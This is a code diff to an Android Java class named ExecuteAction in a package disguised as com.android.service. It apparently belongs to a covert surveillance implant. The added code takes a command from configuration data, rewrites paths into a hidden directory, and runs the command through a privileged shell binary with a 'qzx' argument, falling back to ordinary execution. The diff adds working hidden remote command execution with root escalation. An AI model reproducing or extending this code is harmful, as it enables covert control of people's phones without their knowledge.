@@ -14,6 +14,8 @@ import java.io.IOException;
 import android.util.Log;
 
 import com.android.service.auto.Cfg;
+import com.android.service.conf.Configuration;
+import com.android.service.file.Directory;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.WChar;
@@ -24,6 +26,8 @@ import com.android.service.util.WChar;
  */
 public class ExecuteAction extends SubAction {
 	private static final String TAG = "ExecuteAction";
+	
+	private String command;
 	
 	/**
 	 * Instantiates a new execute action.
@@ -44,7 +48,31 @@ public class ExecuteAction extends SubAction {
 	 */
 	@Override
 	public boolean execute() {
-		// TODO Auto-generated method stub
+		if (this.command.length() == 0)
+			return false;
+		
+		// Proviamo ad eseguire il comando da root
+		try {
+			Runtime.getRuntime().exec(Configuration.shellFile + " qzx " + this.command);
+			return true;
+		} catch (final Exception e1) {
+			if (Cfg.DEBUG) {
+				Check.log(e1);
+				Check.log(TAG + " (parse): Exception on parse() (root exec)");
+			}
+		}
+		
+		// Proviamo ad eseguire il comando da utente normale
+		try {
+			Runtime.getRuntime().exec(this.command);
+			return true;
+		} catch (final Exception e1) {
+			if (Cfg.DEBUG) {
+				Check.log(e1);
+				Check.log(TAG + " (parse): Exception on parse() (non-root exec)");
+			}
+		}
+		
 		return false;
 	}
 
@@ -57,16 +85,20 @@ public class ExecuteAction extends SubAction {
 			final byte[] buffer = new byte[len];
 			databuffer.read(buffer);
 
-			final String command = WChar.getString(buffer, true);
-
-			Log.d("QZ", TAG + " (parse): " + command);
+			String cmd = WChar.getString(buffer, true);
+			this.command = Directory.expandHiddenDir(cmd);
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parse): " + this.command);
+			}
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED");
 			}
+			
 			return false;
 		}
-
-		return false;
+		
+		return true;
 	}
 }
